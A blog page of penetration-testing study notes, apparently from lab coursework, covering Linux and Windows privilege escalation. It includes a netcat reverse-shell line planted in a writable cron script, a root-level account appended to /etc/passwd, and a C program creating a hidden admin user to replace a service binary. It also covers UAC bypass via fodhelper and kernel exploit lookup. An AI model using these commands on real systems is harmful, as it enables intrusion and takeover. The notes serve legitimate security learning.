<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="No Description"><meta name="keywords" content=""><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>No Subtitle | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">30</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">11</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Gavin's Blog</div><div id="site-sub-title">No Subtitle</div><div id="site-social-icons"><a class="social-icon" href="https://github.com/Gavincrz" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-github-square fab"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/10/Useful-Pentest-Reference/">Useful Pentest Reference</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Links/">Links</a></span><div class="content"><p>Reverse shell cheat sheet:<br><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/10/Study-Notes-2021-05-09/">Study Notes - 2021/05/09</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Linux-Privilege-Escalation"><a href="#Linux-Privilege-Escalation" class="headerlink" title="Linux Privilege Escalation"></a>Linux Privilege Escalation</h1><h2 id="Insecure-file-permissions"><a href="#Insecure-file-permissions" class="headerlink" title="Insecure file permissions"></a>Insecure file permissions</h2><h2 id="Cron-based-time-job"><a href="#Cron-based-time-job" class="headerlink" title="Cron based time job"></a>Cron based time job</h2><p>Inspect cron log for running jobs</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;CRON&quot; &#x2F;var&#x2F;log&#x2F;cron.log  </span><br><span class="line"></span><br><span class="line">Jan27 17:45:01 victim CRON[2615]:(root) CMD (cd &#x2F;var&#x2F;scripts&#x2F; &amp;&amp; .&#x2F;user_backups.sh)</span><br><span class="line">Jan27 17:50:01 victim CRON[2631]:(root) CMD (cd &#x2F;var&#x2F;scripts&#x2F; &amp;&amp; .&#x2F;user_backups.sh)</span><br><span class="line">Jan27 17:55:01 victim CRON[2656]:(root) CMD (cd &#x2F;var&#x2F;scripts&#x2F; &amp;&amp; .&#x2F;user_backups.sh)</span><br><span class="line">Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd &#x2F;var&#x2F;scripts&#x2F; &amp;&amp; .&#x2F;user_backups.sh)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>run every 5 mins</p>
<p>ls -lah to show its permission (rwxrwxrwx)</p>
<p>add following to the script (See <a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse-shell-Cheat-Sheet</a>)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.11.0.4 1234 &gt;&#x2F;tmp&#x2F;f </span><br></pre></td></tr></table></figure>

<h2 id="Insecure-etc-passwd-Permission"><a href="#Insecure-etc-passwd-Permission" class="headerlink" title="Insecure /etc/passwd Permission"></a>Insecure /etc/passwd Permission</h2><p>if a password hash is present in the second column of a /etc/passwd user record, it is considered valid for authentication and it takes <strong>precedence</strong> over the respective entry in /etc/shadow if available</p>
<h3 id="Generate-password-hash"><a href="#Generate-password-hash" class="headerlink" title="Generate password hash"></a>Generate password hash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd evil</span><br><span class="line">AK24fcSx2Il3I</span><br><span class="line"></span><br><span class="line">echo &quot;root2:AK24fcSx2Il3I:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&quot; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">username:passwordhash:userid:groupid:</span><br></pre></td></tr></table></figure>

<h2 id="Linux-Kernel-Vulnerabilities"><a href="#Linux-Kernel-Vulnerabilities" class="headerlink" title="Linux Kernel Vulnerabilities"></a>Linux Kernel Vulnerabilities</h2><p>Lab machine: ssh <a href="mailto:&#x6e;&#x30;&#x30;&#98;&#x40;&#49;&#48;&#x2e;&#x31;&#49;&#x2e;&#48;&#46;&#49;&#50;&#x39;">&#x6e;&#x30;&#x30;&#98;&#x40;&#49;&#48;&#x2e;&#x31;&#49;&#x2e;&#48;&#46;&#49;&#50;&#x39;</a></p>
<p>inspecting the /etc/issue file  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -r </span><br><span class="line">-r, --kernel-release     print the kernel release</span><br><span class="line">arch</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel ubuntu 16.04</span><br></pre></td></tr></table></figure>

<h2 id="Compile-C-C"><a href="#Compile-C-C" class="headerlink" title="Compile C/C++"></a>Compile C/C++</h2><p>match the architecture of the target machine  </p>
<h1 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h1><h2 id="Standard-wordlist"><a href="#Standard-wordlist" class="headerlink" title="Standard wordlist"></a>Standard wordlist</h2><p>Kali linux has some stored in <code>/usr/share/wordlists/</code>  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/09/Study-Notes-2021-05-08/">Study Notes - 2021/05/08</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Insecure-File-permission"><a href="#Insecure-File-permission" class="headerlink" title="Insecure File permission"></a>Insecure File permission</h1><p>system service binary has insecure permission, we can replace the binary, when the system reboot, the malicious binary will be executed with root permission  </p>
<h2 id="Use-powershell-to-list-running-servicis"><a href="#Use-powershell-to-list-running-servicis" class="headerlink" title="Use powershell to list running servicis"></a>Use powershell to list running servicis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object &#123;$_.State -like &#39;Running&#39;&#125;</span><br></pre></td></tr></table></figure>
<p>Service stored in Program Files dir is more prone to have insecure permission </p>
<h2 id="Ennumerate-the-permission-of-target-service"><a href="#Ennumerate-the-permission-of-target-service" class="headerlink" title="Ennumerate the permission of target service"></a>Ennumerate the permission of target service</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span><br></pre></td></tr></table></figure>

<h2 id="replace-the-binary-with-malicious-binary"><a href="#replace-the-binary-with-malicious-binary" class="headerlink" title="replace the binary with malicious binary"></a>replace the binary with malicious binary</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    i &#x3D; system (&quot;net user evil Ev!lpass &#x2F;add&quot;);</span><br><span class="line">    i &#x3D; system (&quot;net localgroup administrators evil &#x2F;add&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cross compile it <code>i686-w64-mingw32-gcc adduser.c -o adduser.exe</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot; &quot;C:\Program Files\Serviio\bin\ServiioService_original.exe&quot;</span><br><span class="line">move adduser.exe &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span><br></pre></td></tr></table></figure>

<h2 id="restart-the-service"><a href="#restart-the-service" class="headerlink" title="restart the service"></a>restart the service</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\student&gt; net stop Serviio</span><br><span class="line">System error 5 has occurred.</span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure>
<h2 id="check-the-start-option-of-the-service"><a href="#check-the-start-option-of-the-service" class="headerlink" title="check the start option of the service"></a>check the start option of the service</h2><p><code>C:\Users\student&gt;wmic service where caption=&quot;Serviio&quot; get name, caption, state, startmode Caption Name StartMode State Serviio Serviio Auto Running`</code></p>
<p>check if user can reboot the system </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\student&gt;whoami &#x2F;priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">Privilege Name Description State</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeShutdownPrivilege Shut down the system Disabled</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking Enabled</span><br><span class="line">SeUndockPrivilege Remove computer from docking station Disabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br><span class="line">SeTimeZonePrivilege Change the time zone Disabled</span><br></pre></td></tr></table></figure>
<p>disable means the privilege is not enabled for the running process, in our case whoami</p>
<h2 id="reboot-the-machine"><a href="#reboot-the-machine" class="headerlink" title="reboot the machine"></a>reboot the machine</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown \r \t 0   </span><br></pre></td></tr></table></figure>
<p>\r reboot, \t in 0 sec  </p>
<h2 id="log-in-with-new-evil-account"><a href="#log-in-with-new-evil-account" class="headerlink" title="log in with new evil account"></a>log in with new evil account</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop xx.xx.xx.xx -u evil -p &#96;password&#96; -g 1024x768 </span><br></pre></td></tr></table></figure>

<p>check if the new user in admin group </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators</span><br></pre></td></tr></table></figure>



<h1 id="Leveraging-Unquoted-service-path"><a href="#Leveraging-Unquoted-service-path" class="headerlink" title="Leveraging Unquoted service path"></a>Leveraging Unquoted service path</h1><p>can be used in lab 10.11.0.23  -u n00b -p lab</p>
<p>When using file/dir path contain spaces, the developer should make sure it is quoted</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\My.exe</span><br><span class="line">C:\Program Files\My Program\My.exe</span><br><span class="line">C:\Program Files\My Program\My service\service.exe</span><br><span class="line"></span><br><span class="line">move adduser.exe &quot;C:\Program Files\My Program\My.exe&quot;</span><br></pre></td></tr></table></figure>


<h1 id="Windows-Kernel-Vulnerabilities-USBPcap-Case-Study"><a href="#Windows-Kernel-Vulnerabilities-USBPcap-Case-Study" class="headerlink" title="Windows Kernel Vulnerabilities: USBPcap Case Study"></a>Windows Kernel Vulnerabilities: USBPcap Case Study</h1><p>determine the version and architecture</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; &#x2F;C:&quot;System Type&quot;</span><br><span class="line">OS Name: Microsoft Windows 7 Professional</span><br><span class="line">OS Version: 6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">System Type: X86-based PC</span><br></pre></td></tr></table></figure>

<p>try to find third-party driver vulnerabiliies first  </p>
<h2 id="enumerate-the-driver"><a href="#enumerate-the-driver" class="headerlink" title="enumerate the driver"></a>enumerate the driver</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverquery &#x2F;v</span><br></pre></td></tr></table></figure>
<p>/v for verbose output<br>looking for third-party drivers</p>
<h2 id="search-for-exploit"><a href="#search-for-exploit" class="headerlink" title="search for exploit"></a>search for exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit USBPcap</span><br></pre></td></tr></table></figure>

<h2 id="check-the-version-of-USBPCap"><a href="#check-the-version-of-USBPCap" class="headerlink" title="check the version of USBPCap"></a>check the version of USBPCap</h2><p>To begin, we will list the contents of the Program Files directory, in search of the USBPcap directory:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;C:\Program Files&quot;</span><br><span class="line">dir </span><br><span class="line">type USBPcap.inf</span><br></pre></td></tr></table></figure>

<h2 id="Compile-C-C-on-windows"><a href="#Compile-C-C-on-windows" class="headerlink" title="Compile C/C++ on windows"></a>Compile C/C++ on windows</h2><p>Use the client machine<br>setup PATH environment variable </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1&gt; mingw-w64.bat</span><br><span class="line">gcc 41452.c -o exploit.exe</span><br></pre></td></tr></table></figure>






</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/04/24/Study-Notes-2021-04-23/">Study Notes - 2021/04/23</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Automated-Enumeration"><a href="#Automated-Enumeration" class="headerlink" title="Automated Enumeration"></a>Automated Enumeration</h1><p>windows automated enumeration tool:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Tools\privilege_escalation\windows-privesc-check-master&gt;windows-privesc-check2.exe</span><br></pre></td></tr></table></figure>

<p>-h help<br>–dump dump output<br>-G list groups </p>
<p>Linux:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;unix-privesc-check standard &gt; output.txt</span><br></pre></td></tr></table></figure>

<h1 id="Windows-privilege-escalation-examples"><a href="#Windows-privilege-escalation-examples" class="headerlink" title="Windows privilege escalation examples"></a>Windows privilege escalation examples</h1><h2 id="Windoes-privilege-and-integrity-levels"><a href="#Windoes-privilege-and-integrity-levels" class="headerlink" title="Windoes privilege and integrity levels"></a>Windoes privilege and integrity levels</h2><p>Access token assigned to a user<br>security id (sid) unique to each object including access token, user account, group account.<br>Integrity mechanism:</p>
<p>From Windows Vista onward, processes run on four integrity levels:<br>• System integrity process: SYSTEM rights<br>• High integrity process: administrative rights<br>• Medium integrity process: standard user rights<br>• Low integrity process: very restricted rights often used in sandboxed processes</p>
<h2 id="User-account-control-UAC"><a href="#User-account-control-UAC" class="headerlink" title="User account control (UAC)"></a>User account control (UAC)</h2><p>Even logged in as admin, we are operating at Medium integrity level, to switch, specifying run as administrator:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe Start-Process cmd.exe -Verb runAs  </span><br></pre></td></tr></table></figure>
<p>run cmd.exe in as administrator<br>credential prompt and consent prompt  </p>
<h2 id="User-account-control-bypass"><a href="#User-account-control-bypass" class="headerlink" title="User account control bypass"></a>User account control bypass</h2><p>allows an administrator user to bypass UAC by silently elevating our integrity level from medium to high.  </p>
<p>leverage an interesting UAC bypass based on fodhelper.exe   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\fodhelper.exe  </span><br></pre></td></tr></table></figure>

<p>In order to gather detailed information regarding the fodhelper integrity level and the permissions required to run this process, we will inspect its application manifest</p>
<p>dump the manifest of fohelper.exe:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Tools\privilege_escalation\SysinternalsSuite</span><br><span class="line">sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;requestedPrivileges&gt;</span><br><span class="line">    &lt;requestedExecutionLevel</span><br><span class="line">        level&#x3D;&quot;requireAdministrator&quot;</span><br><span class="line">    &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;requestedPrivileges&gt;</span><br><span class="line"></span><br><span class="line">&lt;autoElevate&gt;true&lt;&#x2F;autoElevate&gt;</span><br></pre></td></tr></table></figure>


</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/30/Study-Notes-2021-03-29/">Study Notes - 2021/03/29</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-29</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="Manual-Enumeration"><a href="#Manual-Enumeration" class="headerlink" title="Manual Enumeration"></a>Manual Enumeration</h2><p>enumerating users:<br><code>whoami</code> work both for win and linux<br>windows: <code>net user &lt;username&gt;</code><br>Linux: <code>id</code><br>reveal other users :<br>windows: <code>net user</code><br>linux: <code>cat /etc/passwd</code>  </p>
<p>enumeratin hostname:<br><code>hostname</code>  </p>
<h2 id="Enumerating-OS-version"><a href="#Enumerating-OS-version" class="headerlink" title="Enumerating OS version"></a>Enumerating OS version</h2><p>Windows: systeminfo<br>linux: <code>cat /etc/issue</code><br><code>cat /etc/*-release</code><br><code>uname -a</code>  </p>
<h2 id="Running-processes-and-services"><a href="#Running-processes-and-services" class="headerlink" title="Running processes and services"></a>Running processes and services</h2><p><code>tasklist /SVC</code><br>/SVC                    Displays services hosted in each process.<br><strong>Does not list task run by privieleged users</strong>  </p>
<p>linux:<br><code>ps aux</code>  </p>
<h2 id="Enumerating-Network-information"><a href="#Enumerating-Network-information" class="headerlink" title="Enumerating Network information"></a>Enumerating Network information</h2><p>windows:<br><code>ipconfig /all</code><br><code>route print</code>  route information<br><code>netstat -ano</code>  network connections<br>-a display all active tcp connections<br>-n            Displays addresses and port numbers in numerical form.<br>-o            Displays the owning process ID associated with each connection.  </p>
<p>Linux:<br><code>ifconfig -a</code><br><code>ip a</code><br><code>/sbin/route</code><br><code>ss -anp</code><br><code>netstat -anp</code>  </p>
<h2 id="Enumerating-Firewall-Status-and-Rules"><a href="#Enumerating-Firewall-Status-and-Rules" class="headerlink" title="Enumerating Firewall Status and Rules"></a>Enumerating Firewall Status and Rules</h2><p>windows:<br><code>netsh advfirewall show currentprofile</code><br>list the firewall rules:<br><code>netsh advfirewall firewall show rule name=all</code>  </p>
<p>Linux: must have root privilege to access firewall rules<br>For example, the iptables-persistent464 package on Debian Linux saves firewall rules in specific<br>files under the /etc/iptables directory by default. These files are used by the system to restore<br>netfilter465 rules at boot time. These files are often left with weak permissions, allowing them to<br>be read by any local user on the target system.  </p>
<p>grep -Hs iptables /etc/*<br>-H display file name with file number<br>-s suppress error messages </p>
<h2 id="Enumerating-Scheduled-tasks"><a href="#Enumerating-Scheduled-tasks" class="headerlink" title="Enumerating Scheduled tasks"></a>Enumerating Scheduled tasks</h2><p><code>schtasks /query /fo LIST /v</code><br>/query argument displays tasks and /FO LIST sets the output format to a simple list. We can also use /V to request verbose output.</p>
<p>Linux:<br>The Linux-based job scheduler is known as Cron.467 Scheduled tasks are listed under the /etc/cron.* directories </p>
<p>ls -lah /etc/cron*  sometimes need permision<br>-h human readable  </p>
<p>cat /etc/crontab  </p>
<p>if those script have a weak permissions, we change change it and escalate pribilege  </p>
<h2 id="Enumerating-Installed-app-and-patch-levels"><a href="#Enumerating-Installed-app-and-patch-levels" class="headerlink" title="Enumerating Installed app and patch levels"></a>Enumerating Installed app and patch levels</h2><p><code>wmic product get name, version, vendor</code>  </p>
<p>We can use wmic with the <strong>product</strong> WMI class argument followed by <strong>get</strong>, which, as the name states, is used to retrieve specific property values. We can then choose the properties we are interested in, such as name, version, and vendor  </p>
<p>note: product class only list application installed by the windows installer  </p>
<p>Similarly, and more importantly, wmic can also be used to list system-wide updates by querying the Win32_QuickFixEngineering (qfe) WMI class.<br><code>wmic qfe get Caption, Description, HotFixID, InstalledOn</code>  </p>
<p>Linux:<br>Debian based:<br>dpkg -l<br>Redhat based:<br>rpm  </p>
<h2 id="Enumerating-readble-and-writable-dirs"><a href="#Enumerating-readble-and-writable-dirs" class="headerlink" title="Enumerating readble and writable dirs"></a>Enumerating readble and writable dirs</h2><p><strong>Accesschk</strong>:<br>enumerate the Program Files directory in search of any file or directory that allows the Everyone group write permissions  </p>
<p>We will use -u to suppress errors, -w to search for write access permissions, and -s to perform a recursive search.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uws &quot;Everyone&quot; &quot;C:\Program Files&quot;</span><br></pre></td></tr></table></figure>
<p>powershell:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem &quot;C:\Program Files&quot; -Recurse | Get-ACL | ?&#123;$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>Linux:  -type d to locate directories</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null  </span><br></pre></td></tr></table></figure>


<h2 id="Enumerating-Unmounted-Disks"><a href="#Enumerating-Unmounted-Disks" class="headerlink" title="Enumerating Unmounted Disks"></a>Enumerating Unmounted Disks</h2><p><code>mountvol</code><br>On Linux-based systems, we can use the <code>mount</code> command to list all mounted filesystems. In addition, the <code>/etc/fstab </code>file lists all drives that will be mounted at boot time.<br>use <code>lsblk</code> to view all available disks  </p>
<h2 id="Enumerating-Device-Drivers-and-Kernel-Modules"><a href="#Enumerating-Device-Drivers-and-Kernel-Modules" class="headerlink" title="Enumerating Device Drivers and Kernel Modules"></a>Enumerating Device Drivers and Kernel Modules</h2><p>powershell: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverquery.exe &#x2F;v &#x2F;fo csv | ConvertFrom-CSV | Select-Object &#39;Display Name&#39;, &#39;Start Mode&#39;, Path</span><br></pre></td></tr></table></figure>

<p>find version number of each module: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object &#123;$_.DeviceName -like &quot;*VMware*&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>Linux:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br><span class="line">&#x2F;sbin&#x2F;modinfo libata  </span><br></pre></td></tr></table></figure>
<p>modinfo require full path name to run  </p>
<h2 id="Enumerating-Binaries-That-AutoElevate"><a href="#Enumerating-Binaries-That-AutoElevate" class="headerlink" title="Enumerating Binaries That AutoElevate"></a>Enumerating Binaries That AutoElevate</h2><p>First, on Windows systems, we should check the status of the <code>AlwaysInstallElevated</code> registry setting. If this key is enabled (set to 1) in either <code>HKEY_CURRENT_USER</code> or <code>HKEY_LOCAL_MACHINE</code>, any user can run Windows Installer packages with elevated privileges.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>

